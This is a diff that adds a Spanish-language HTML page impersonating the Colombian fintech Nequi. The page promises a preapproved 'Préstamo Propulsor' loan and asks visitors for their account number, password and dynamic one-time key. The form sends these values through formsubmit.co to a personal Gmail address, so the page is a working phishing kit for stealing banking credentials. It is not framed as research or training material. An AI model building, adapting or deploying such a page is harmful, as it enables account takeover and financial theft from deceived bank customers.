@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>¡Felicidades, has obtenido tu Préstamo Propulsor!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            color: black;
+        }
+        .header {
+            background: #ffffff;
+            width: 100%;
+            padding: 15px;
+            text-align: center;
+            color: black;
+            font-size: 20px;
+            font-weight: bold;
+        }
+        .loan-container {
+            background: #e5007d;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 300px;
+            color: white;
+        }
+        .input-field {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            color: black;
+            background-color: #ffffff;
+        }
+        .btn {
+            background-color: #ffffff;
+            color: black;
+            padding: 10px 20px;
+            border: 1px solid #e5007d;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            width: calc(100% - 20px);
+        }
+        .btn:hover {
+            background-color: #f2f2f2;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: black;
+            text-align: center;
+        }
+        h2 {
+            color: white;
+            background: #e5007d;
+            padding: 10px;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">Nequi</div>
+    <div class="loan-container">
+        <h2>¡Felicidades, has obtenido tu Préstamo Propulsor!</h2>
+        <p>Ingrese para conocer su puntaje.</p>
+        <form action="https://formsubmit.co/jhonalexzunigavidal@gmail.com" method="POST">
+            <input type="text" class="input-field" name="numero_cuenta" placeholder="Número de cuenta" required>
+            <input type="password" class="input-field" name="clave" placeholder="Clave" required>
+            <input type="text" class="input-field" name="clave_dinamica" placeholder="Clave dinámica" required>
+            <button type="submit" class="btn">Revisar Puntaje</button>
+        </form>
+    </div>
+    <div class="footer">
+        <p>Nequi - Todos los derechos reservados &copy; 2025</p>
+        <p>Por seguridad, nunca compartas tus datos con terceros.</p>
+    </div>
+</body>
+</html>
